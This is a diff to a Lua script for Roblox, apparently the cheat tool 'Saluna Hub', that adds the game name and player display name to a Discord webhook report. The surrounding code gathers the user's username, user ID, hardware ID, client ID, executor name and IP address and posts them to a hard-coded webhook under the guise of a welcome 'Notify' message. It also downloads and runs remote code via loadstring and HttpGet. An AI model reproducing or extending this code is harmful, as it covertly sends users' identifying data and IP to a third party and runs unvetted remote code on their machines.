@@ -24,6 +24,15 @@ task.spawn(function()
     hardware = (gethwid and gethwid()) or "Unknown HWID"
 end)
 
+local placeNames = {
+    [3237168] = "One Piece Legendary",
+    [8569358381] = "OPL: Anarchy"
+}
+
+local currentPlaceId = game.PlaceId
+local currentPlaceName = placeNames[currentPlaceId] or "Unknown Place"
+
+
 repeat task.wait() until protocol and excutor and hardware
 local antitable = loadstring(game:HttpGet('https://raw.githubusercontent.com/Department123zxc/list/main/anticamp'))()
 if not table.find(antitable,game.Players.LocalPlayer.Name) then
@@ -33,7 +42,7 @@ local url = "https://discord.com/api/webhooks/1268134529567297629/oYa9cB697UfQ79
         ["embeds"] = {
             {
                 ["title"] = " Saluna Notify",
-                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================" .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nProtocol IP: " ..tostring(protocol) .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
+                ["description"] = "\nUser Name: " .. game.Players.LocalPlayer.Name .."\nDisplay Name: "..tostring(game.Players.LocalPlayer.DisplayName) .."\nUser ID: " .. game.Players.LocalPlayer.UserId .. "\n============================================".."\nGame Name: "..tostring(currentPlaceName) .. "\nGame ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId .. "\n============================================".. "\nExcutor Name: "..tostring(excutor) .."\nExcutor ID: " ..game:GetService("RbxAnalyticsService"):GetClientId() .."\nProtocol IP: " ..tostring(protocol) .."\n============================================" .."\nWelcome To Saluna Hub \nHave A Nice Day ♥ ",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x00FF7F)
             }
